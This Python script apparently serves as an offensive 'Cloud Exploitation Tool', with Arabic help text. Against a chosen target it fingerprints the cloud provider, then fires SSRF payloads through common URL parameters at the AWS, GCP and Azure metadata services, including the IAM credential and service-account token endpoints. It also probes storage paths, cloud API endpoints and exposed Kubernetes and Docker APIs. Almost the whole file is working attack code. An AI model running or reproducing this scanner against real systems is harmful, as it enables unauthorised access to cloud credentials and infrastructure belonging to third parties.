#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib3
import concurrent.futures
import argparse
import sys
import os
import json
import base64
import socket
from datetime import datetime
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

class CloudExploits:
    def __init__(self, target, threads=10):
        self.target = target
        self.threads = threads
        self.results = []
        self.vulnerable_urls = []
        self.total_scanned = 0
        self.vulnerabilities_found = 0
        self.cloud_provider = None
        self.metadata_endpoints = []
        
    def log_result(self, url, status, details="", severity="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if "CRITICAL" in status or severity == "CRITICAL":
            print(f"{Colors.RED}[{timestamp}] [CRITICAL] {url} - {details}{Colors.RESET}")
            self.vulnerabilities_found += 1
        elif "HIGH" in status or severity == "HIGH":
            print(f"{Colors.YELLOW}[{timestamp}] [HIGH] {url} - {details}{Colors.RESET}")
            self.vulnerabilities_found += 1
        elif "VULNERABLE" in status:
            print(f"{Colors.GREEN}[{timestamp}] [VULN] {url}{Colors.RESET}")
            self.vulnerable_urls.append(url)
            self.vulnerabilities_found += 1
        elif "ERROR" in status:
            print(f"{Colors.RED}[{timestamp}] [ERROR] {url} - {details}{Colors.RESET}")
        elif "POTENTIAL" in status:
            print(f"{Colors.YELLOW}[{timestamp}] [POTENTIAL] {url} - {details}{Colors.RESET}")
        else:
            print(f"{Colors.BLUE}[{timestamp}] [SCAN] {url}{Colors.RESET}")
        
        self.results.append({
            'timestamp': timestamp,
            'url': url,
            'status': status,
            'details': details,
            'severity': severity
        })
        self.total_scanned += 1

    def detect_cloud_provider(self):
        """Detect cloud provider based on domain and headers"""
        try:
            # AWS detection patterns
            aws_patterns = [
                'amazonaws.com', 's3.amazonaws.com', 'ec2.amazonaws.com',
                'elasticbeanstalk.com', 'cloudfront.net', 'awsstatic.com',
                'elastic.co'
            ]
            
            # Azure detection patterns
            azure_patterns = [
                'azurewebsites.net', 'cloudapp.azure.com', 'blob.core.windows.net',
                'database.windows.net', 'azure-api.net', 'azureedge.net'
            ]
            
            # GCP detection patterns
            gcp_patterns = [
                'appspot.com', 'googleapis.com', 'cloudfunctions.net',
                'run.app', 'firebaseapp.com', 'cloud.google.com'
            ]
            
            target_lower = self.target.lower()
            
            for pattern in aws_patterns:
                if pattern in target_lower:
                    self.cloud_provider = "AWS"
                    self.log_result(self.target, "DETECTED", f"AWS Cloud Provider detected via domain pattern: {pattern}", "INFO")
                    return "AWS"
            
            for pattern in azure_patterns:
                if pattern in target_lower:
                    self.cloud_provider = "Azure"
                    self.log_result(self.target, "DETECTED", f"Azure Cloud Provider detected via domain pattern: {pattern}", "INFO")
                    return "Azure"
            
            for pattern in gcp_patterns:
                if pattern in target_lower:
                    self.cloud_provider = "GCP"
                    self.log_result(self.target, "DETECTED", f"GCP Cloud Provider detected via domain pattern: {pattern}", "INFO")
                    return "GCP"
            
            # Check response headers for cloud indicators
            try:
                response = requests.get(f"http://{self.target}", timeout=5, verify=False)
                
                # AWS headers
                aws_headers = ['x-amz-request-id', 'x-amz-id-2', 'x-amz-cf-id']
                for header in aws_headers:
                    if header in response.headers:
                        self.cloud_provider = "AWS"
                        self.log_result(self.target, "DETECTED", f"AWS Cloud Provider detected via header: {header}", "INFO")
                        return "AWS"
                
                # Azure headers
                azure_headers = ['x-ms-request-id', 'x-ms-version']
                for header in azure_headers:
                    if header in response.headers:
                        self.cloud_provider = "Azure"
                        self.log_result(self.target, "DETECTED", f"Azure Cloud Provider detected via header: {header}", "INFO")
                        return "Azure"
                
                # GCP headers
                gcp_headers = ['x-goog-generation', 'x-goog-hash']
                for header in gcp_headers:
                    if header in response.headers:
                        self.cloud_provider = "GCP"
                        self.log_result(self.target, "DETECTED", f"GCP Cloud Provider detected via header: {header}", "INFO")
                        return "GCP"
                        
            except:
                pass
                
            self.log_result(self.target, "UNKNOWN", "Cloud provider could not be detected", "INFO")
            return "Unknown"
            
        except Exception as e:
            self.log_result(self.target, "ERROR", f"Cloud provider detection failed: {str(e)}", "ERROR")
            return "Unknown"

    def exploit_aws_metadata(self):
        """Exploit AWS metadata service vulnerabilities"""
        if self.cloud_provider != "AWS":
            return
            
        print(f"{Colors.CYAN}[*] Testing AWS metadata service exploitation...{Colors.RESET}")
        
        # AWS metadata endpoints
        aws_metadata_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/meta-data/public-ipv4',
            'http://169.254.169.254/latest/meta-data/local-ipv4',
            'http://169.254.169.254/latest/meta-data/instance-id',
            'http://169.254.169.254/latest/meta-data/ami-id',
            'http://169.254.169.254/latest/meta-data/hostname'
        ]
        
        # SSRF payloads for AWS metadata
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://instance-data/latest/meta-data/',
            'http://[fd00:ec2::254]/latest/meta-data/',
            'http://aws.amazon.com///169.254.169.254/latest/meta-data/'
        ]
        
        # Test direct metadata access (if running on AWS instance)
        for endpoint in aws_metadata_endpoints[:3]:  # Test most critical first
            try:
                response = requests.get(endpoint, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 10:
                    self.log_result(endpoint, "VULNERABLE - AWS Metadata Exposed", 
                                  f"Direct metadata access possible: {response.text[:100]}...", "CRITICAL")
                    self.metadata_endpoints.append(endpoint)
            except:
                pass
        
        # Test SSRF-based metadata access
        common_params = ['url', 'link', 'redirect', 'return', 'callback', 'next', 'target', 'dest']
        
        for payload in ssrf_payloads:
            for param in common_params:
                test_url = f"http://{self.target}?{param}={payload}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    # Check for metadata indicators in response
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        metadata_indicators = [
                            'ami-', 'instance-id', 'public-ipv4', 'security-credentials',
                            'accountid', 'user-data', 'placement/', 'block-device-mapping'
                        ]
                        
                        for indicator in metadata_indicators:
                            if indicator in response_text:
                                self.log_result(test_url, "VULNERABLE - SSRF to AWS Metadata", 
                                              f"Parameter {param} leaked AWS metadata containing {indicator}", "CRITICAL")
                                break
                                
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    pass
                except Exception:
                    pass

    def exploit_gcp_metadata(self):
        """Exploit GCP metadata service vulnerabilities"""
        if self.cloud_provider != "GCP":
            return
            
        print(f"{Colors.CYAN}[*] Testing GCP metadata service exploitation...{Colors.RESET}")
        
        # GCP metadata endpoints
        gcp_metadata_endpoints = [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/instance/attributes/',
            'http://metadata.google.internal/computeMetadata/v1/project/project-id'
        ]
        
        # Required header for GCP metadata
        headers = {'Metadata-Flavor': 'Google'}
        
        # Test direct metadata access
        for endpoint in gcp_metadata_endpoints[:2]:  # Test most critical first
            try:
                response = requests.get(endpoint, headers=headers, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 5:
                    self.log_result(endpoint, "VULNERABLE - GCP Metadata Exposed", 
                                  f"Direct metadata access possible: {response.text[:100]}...", "CRITICAL")
                    self.metadata_endpoints.append(endpoint)
            except:
                pass
        
        # Test SSRF-based GCP metadata access
        common_params = ['url', 'link', 'redirect', 'return', 'callback']
        
        for endpoint in gcp_metadata_endpoints:
            for param in common_params:
                # Test with metadata header via SSRF
                test_url = f"http://{self.target}?{param}={endpoint}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        gcp_indicators = [
                            'computeMetadata', 'service-accounts', 'access_token', 
                            'project-id', 'instance-id', 'kube-env'
                        ]
                        
                        for indicator in gcp_indicators:
                            if indicator in response_text:
                                self.log_result(test_url, "VULNERABLE - SSRF to GCP Metadata", 
                                              f"Parameter {param} leaked GCP metadata containing {indicator}", "CRITICAL")
                                break
                                
                except:
                    pass

    def exploit_azure_metadata(self):
        """Exploit Azure metadata service vulnerabilities"""
        if self.cloud_provider != "Azure":
            return
            
        print(f"{Colors.CYAN}[*] Testing Azure metadata service exploitation...{Colors.RESET}")
        
        # Azure metadata endpoints
        azure_metadata_endpoints = [
            'http://169.254.169.254/metadata/instance/',
            'http://169.254.169.254/metadata/instance/compute/',
            'http://169.254.169.254/metadata/instance/network/',
            'http://169.254.169.254/metadata/instance/compute/vmScaleSetName',
            'http://169.254.169.254/metadata/instance/compute/resourceGroupName'
        ]
        
        # Required header for Azure metadata
        headers = {'Metadata': 'true'}
        
        # Test direct metadata access
        for endpoint in azure_metadata_endpoints[:2]:  # Test most critical first
            try:
                response = requests.get(endpoint, headers=headers, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 10:
                    self.log_result(endpoint, "VULNERABLE - Azure Metadata Exposed", 
                                  f"Direct metadata access possible: {response.text[:100]}...", "CRITICAL")
                    self.metadata_endpoints.append(endpoint)
            except:
                pass
        
        # Test SSRF-based Azure metadata access
        common_params = ['url', 'link', 'redirect', 'return', 'callback']
        
        for endpoint in azure_metadata_endpoints:
            for param in common_params:
                test_url = f"http://{self.target}?{param}={endpoint}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        azure_indicators = [
                            'compute', 'network', 'vmScaleSetName', 'resourceGroupName',
                            'subscriptionId', 'location', 'vmSize'
                        ]
                        
                        for indicator in azure_indicators:
                            if indicator in response_text:
                                self.log_result(test_url, "VULNERABLE - SSRF to Azure Metadata", 
                                              f"Parameter {param} leaked Azure metadata containing {indicator}", "CRITICAL")
                                break
                                
                except:
                    pass

    def exploit_cloud_storage(self):
        """Exploit cloud storage misconfigurations"""
        print(f"{Colors.CYAN}[*] Testing cloud storage exploitation...{Colors.RESET}")
        
        # Common cloud storage endpoints
        storage_endpoints = [
            '/s3', '/s3-bucket', '/storage', '/files', '/uploads', '/assets',
            '/images', '/documents', '/media', '/content', '/data'
        ]
        
        # Test S3 bucket misconfigurations
        if self.cloud_provider == "AWS" or not self.cloud_provider:
            s3_payloads = [
                'https://s3.amazonaws.com/',
                'https://s3-us-east-1.amazonaws.com/',
                'http://s3.amazonaws.com/',
                's3://bucket-name/',
                's3://public-bucket/'
            ]
            
            for endpoint in storage_endpoints:
                for payload in s3_payloads:
                    test_url = f"http://{self.target}{endpoint}?url={payload}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if response.status_code == 200:
                            self.log_result(test_url, "POTENTIAL - S3 Storage Access", 
                                          f"S3 bucket access possible via {endpoint}", "MEDIUM")
                    except:
                        pass
        
        # Test Azure Blob storage
        if self.cloud_provider == "Azure" or not self.cloud_provider:
            azure_storage_payloads = [
                'https://blob.core.windows.net/',
                'https://storageaccount.blob.core.windows.net/',
                'azure-blob://container/'
            ]
            
            for endpoint in storage_endpoints:
                for payload in azure_storage_payloads:
                    test_url = f"http://{self.target}{endpoint}?url={payload}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if response.status_code == 200:
                            self.log_result(test_url, "POTENTIAL - Azure Storage Access", 
                                          f"Azure blob storage access possible via {endpoint}", "MEDIUM")
                    except:
                        pass

    def exploit_cloud_apis(self):
        """Exploit cloud API vulnerabilities"""
        print(f"{Colors.CYAN}[*] Testing cloud API exploitation...{Colors.RESET}")
        
        # Common cloud API endpoints
        cloud_api_endpoints = [
            '/api/cloud', '/api/aws', '/api/azure', '/api/gcp',
            '/cloud/api', '/aws/api', '/azure/api', '/gcp/api',
            '/api/v1/cloud', '/api/v1/aws', '/api/v1/azure', '/api/v1/gcp'
        ]
        
        # Test for excessive permissions in cloud APIs
        for endpoint in cloud_api_endpoints:
            url = f"http://{self.target}{endpoint}"
            try:
                # Test GET access
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    self.log_result(url, "POTENTIAL - Cloud API Exposed", 
                                  f"Cloud API endpoint accessible: {endpoint}", "HIGH")
                
                # Test with common cloud API keys
                cloud_api_keys = [
                    'AWS_ACCESS_KEY_ID',
                    'AWS_SECRET_ACCESS_KEY', 
                    'AZURE_SUBSCRIPTION_ID',
                    'GOOGLE_APPLICATION_CREDENTIALS'
                ]
                
                for key_name in cloud_api_keys:
                    headers = {'Authorization': f'Bearer {key_name}-test-key'}
                    response = requests.get(url, headers=headers, timeout=5, verify=False)
                    if response.status_code == 200:
                        self.log_result(url, "VULNERABLE - Cloud API Key Bypass", 
                                      f"API key bypass possible with {key_name}", "HIGH")
                        
            except:
                pass

    def exploit_container_vulnerabilities(self):
        """Exploit container and orchestration vulnerabilities"""
        print(f"{Colors.CYAN}[*] Testing container exploitation...{Colors.RESET}")
        
        # Kubernetes/Docker endpoints
        container_endpoints = [
            '/kubernetes', '/k8s', '/kube', '/pods', '/nodes',
            '/docker', '/containers', '/swarm', '/orchestrate',
            '/api/v1/pods', '/api/v1/nodes', '/api/v1/services'
        ]
        
        # Test for exposed Kubernetes API
        for endpoint in container_endpoints:
            url = f"http://{self.target}{endpoint}"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    response_text = response.text.lower()
                    if any(indicator in response_text for indicator in ['kubernetes', 'kube-', 'pod', 'node']):
                        self.log_result(url, "VULNERABLE - Kubernetes API Exposed", 
                                      f"Kubernetes API accessible at {endpoint}", "CRITICAL")
            except:
                pass
        
        # Test for Docker API
        docker_endpoints = ['/version', '/info', '/containers/json']
        for endpoint in docker_endpoints:
            url = f"http://{self.target}:2375{endpoint}"  # Docker default port
            try:
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200 and 'docker' in response.text.lower():
                    self.log_result(url, "VULNERABLE - Docker API Exposed", 
                                  f"Docker API accessible on port 2375", "CRITICAL")
            except:
                pass

    def run_all_exploits(self):
        """Run all cloud exploitation tests"""
        print(f"{Colors.CYAN}[*] Starting comprehensive cloud exploitation scan...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Target: {self.target}{Colors.RESET}")
        
        # Detect cloud provider first
        self.detect_cloud_provider()
        
        # Run provider-specific exploits
        self.exploit_aws_metadata()
        self.exploit_gcp_metadata()
        self.exploit_azure_metadata()
        
        # Run general cloud exploits
        self.exploit_cloud_storage()
        self.exploit_cloud_apis()
        self.exploit_container_vulnerabilities()
        
        print(f"\n{Colors.GREEN}[+] Cloud exploitation scan completed!{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Total vulnerabilities found: {self.vulnerabilities_found}{Colors.RESET}")
        
        return self.generate_report()

    def generate_report(self):
        """Generate detailed cloud exploitation report"""
        report_file = f"cloud_exploitation_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report_data = {
            'scan_metadata': {
                'target': self.target,
                'cloud_provider': self.cloud_provider,
                'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': self.vulnerabilities_found,
                'total_scanned': self.total_scanned
            },
            'vulnerabilities': self.results,
            'metadata_endpoints': self.metadata_endpoints,
            'vulnerable_urls': self.vulnerable_urls,
            'risk_assessment': {
                'critical_count': len([r for r in self.results if r['severity'] == 'CRITICAL']),
                'high_count': len([r for r in self.results if r['severity'] == 'HIGH']),
                'medium_count': len([r for r in self.results if r['severity'] == 'MEDIUM']),
                'low_count': len([r for r in self.results if r['severity'] == 'LOW'])
            }
        }
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        
        print(f"{Colors.GREEN}[+] Cloud exploitation report saved to: {report_file}{Colors.RESET}")
        return report_file

def main():
    parser = argparse.ArgumentParser(description='Cloud Exploitation Tool - استغلال ثغرات خدمات السحابة')
    parser.add_argument('target', help='الهدف للفحص (مثال: example.com)')
    parser.add_argument('--threads', '-t', type=int, default=10, help='عدد مؤشرات الترابط (الافتراضي: 10)')
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 60)
    print("        CLOUD EXPLOITATION TOOL")
    print("    أداة استغلال ثغرات خدمات السحابة")
    print("=" * 60)
    print(f"{Colors.RESET}")
    
    exploiter = CloudExploits(args.target, args.threads)
    exploiter.run_all_exploits()

if __name__ == "__main__":
    main()